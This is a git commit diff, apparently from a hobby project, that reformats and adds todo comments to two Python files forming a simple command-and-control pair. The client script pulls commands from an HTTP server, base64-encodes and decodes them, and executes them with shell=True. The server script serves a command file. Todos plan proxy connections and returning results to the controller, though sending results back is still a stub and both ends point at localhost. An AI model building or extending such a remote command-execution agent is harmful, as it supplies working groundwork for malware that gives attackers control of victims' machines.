8009ce9417c348cd5d6f68687c454cae0fbb75d2
sn8ke01 <sn8ke01.mac@gmail.com>
2018-09-07 10:14:43 -0500

    added a couple todos

--- c2cli.py
+++ c2cli.py
@@ -2,90 +2,92 @@ import base64
 from subprocess import check_output as cmd_ouput
 import urllib.request
 
+
 # import request
 # Use 'del <module>' to unload a module
 
 # todo: get cmd from c2http
 # todo: connect through proxy
-
+# todo: distinguish between OSs for CMD execution
 
 
 def header():
-	print("----------")
-	print("  c2cli")
-	print("----------")
-
+    print("----------")
+    print("  c2cli")
+    print("----------")
 
 
 def get_cmd_from_c2http(url, port):
     # Connect to c2http server and pull/rcv commands
-	# HTTP GET method
-	target = url + ':' + port
-	response = urllib.request.urlopen(target)
-	cmds = response.read().decode()
-	return cmds
+    # HTTP GET method
+    target = url + ':' + port
+    response = urllib.request.urlopen(target)
+    cmds = response.read().decode()
+    return cmds
 
 
 def execute_cmd(cmd):
     # todo: put in simple error handling
-	
+
     return cmd_ouput(cmd, shell=True)
-	
+
 
 def send_result_to_c2http():
     # Send encoded results back to server
-	# HTTP POST method
+    # HTTP POST method
     pass
 
-	
+
 def b64encode(clear_cmd):
-	ecmd = base64.b64encode(clear_cmd.encode())
-	#print('encoded_cmd fun:: {}'.format(ecmd))
-	return ecmd
-	
+    ecmd = base64.b64encode(clear_cmd.encode())
+    # print('encoded_cmd fun:: {}'.format(ecmd))
+    return ecmd
+
+
 def b64decode(encoded_cmd):
-	dcmd = base64.b64decode(encoded_cmd.decode())
-	#print('decode_cmd fun:: {}'.format(dcmd))
-	return dcmd
+    dcmd = base64.b64decode(encoded_cmd.decode())
+    # print('decode_cmd fun:: {}'.format(dcmd))
+    return dcmd
+
 
 def output_format(output, out_type):
-	print('\n----BEGIN OUT :: TYPE: {}----'.format(out_type))
-	print(output)
-	print('-----END OUT---------------------------------')
-	
-def main():
-	type_clear = 'clear cmd result  '
-	type_encoded = 'encoded cmd result'
-	
-	url = 'http://localhost'
-	port = '8080'
-		
-	header()
-	
-	# Get encoded cmd from c2http.py . 
-	clear_cmd = get_cmd_from_c2http(url, port) #currently local
-	print('CMD from Server:: {}'.format(clear_cmd))
-	
-	encoded_cmd = b64encode(clear_cmd)
-	print('[+] Encoded CMD is "{}"'.format(encoded_cmd))
-	
-	# Decode cmd 
-	decoded_cmd = b64decode(encoded_cmd)
-	print('[+] Decoded CMD is "{}"'.format(decoded_cmd))
-	
-	# Execute and return results
-	cmdout = execute_cmd(decoded_cmd.decode()).strip()
-	output_format(cmdout.decode(), type_clear)
-	
-	#Encode Results
-	clear_output = cmdout.decode()
-	encoded_cmd_output = b64encode(clear_output)
-	output_format(encoded_cmd_output, type_encoded)
-	
-	#todo: send encoded results back to c2http
-	
+    print('\n----BEGIN OUT :: TYPE: {}----'.format(out_type))
+    print(output)
+    print('-----END OUT---------------------------------')
 
-	
+
+def main():
+    type_clear = 'clear cmd result  '
+    type_encoded = 'encoded cmd result'
+
+    url = 'http://localhost'
+    port = '8080'
+
+    header()
+
+    # Get encoded cmd from c2http.py .
+    clear_cmd = get_cmd_from_c2http(url, port)  # currently local
+    print('CMD from Server:: {}'.format(clear_cmd))
+
+    encoded_cmd = b64encode(clear_cmd)
+    print('[+] Encoded CMD is "{}"'.format(encoded_cmd))
+
+    # Decode cmd
+    decoded_cmd = b64decode(encoded_cmd)
+    print('[+] Decoded CMD is "{}"'.format(decoded_cmd))
+
+    # Execute and return results
+    cmdout = execute_cmd(decoded_cmd.decode()).strip()
+    output_format(cmdout.decode(), type_clear)
+
+    # Encode Results
+    clear_output = cmdout.decode()
+    encoded_cmd_output = b64encode(clear_output)
+    output_format(encoded_cmd_output, type_encoded)
+
+
+# todo: send encoded results back to c2http
+
 
 if __name__ == "__main__":
-		main()
+    main()
--- c2http.py
+++ c2http.py
@@ -1,28 +1,32 @@
 #!/usr/bin/python3
 
 # todo: exit gracefully
+# todo: distinguish between OSs for CMD execution
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 
 class server(BaseHTTPRequestHandler):
-	
-	def do_GET(self):
-		if self.path == '/':
-			self.path = '/cmd.html'
-		try:
-			file_to_open = open(self.path[1:]).read() #File containing cmds
-			self.send_response(200)
-		except:
-			file_to_open = "404 Error"
-			self.send_response(404)
-		
-		self.end_headers()
-		self.wfile.write(bytes(file_to_open, 'utf-8'))
-		
-	def do_POST(self):
-		self._set_headers()
-		self.wfile.write("<html><body><h1>POST!</h1></body></html>")
+
+    def do_GET(self):
+        if self.path == '/':
+            self.path = '/cmd.html'
+        try:
+            file_to_open = open(self.path[1:]).read()  # File containing cmds
+            self.send_response(200)
+        except:
+            file_to_open = "404 Error"
+            self.send_response(404)
+
+        self.end_headers()
+        self.wfile.write(bytes(file_to_open, 'utf-8'))
+        '''
+        #Use this to receive data back OR have a seperate for capturing CMD output sent from the client  
+        '''
+
+    def do_POST(self):
+        self._set_headers()
+        self.wfile.write("<html><body><h1>POST!</h1></body></html>")
 
 
 def header():
@@ -56,23 +60,24 @@ def display_cmd_ouput():
 
 
 def main():
-	port = 8080
-	ip = 'localhost'
-	header()
-	
-	# Server
-	httpd = HTTPServer((ip, port), server)
-	print("Server running @ {} on port {}".format(ip, port))
-	httpd.serve_forever()
-	
-	'''
+    port = 8080
+    ip = 'localhost'
+    header()
+
+    # Server
+    httpd = HTTPServer((ip, port), server)
+    print("Server running @ {} on port {}".format(ip, port))
+    httpd.serve_forever()
+
+    '''
     #http_listener_service()
     get_cmd()
     send_cmd()
     encode_cmd()
     decode_results()
     display_cmd_ouput()
-	'''
+    '''
+
 
 if __name__ == "__main__":
-		main()
+    main()
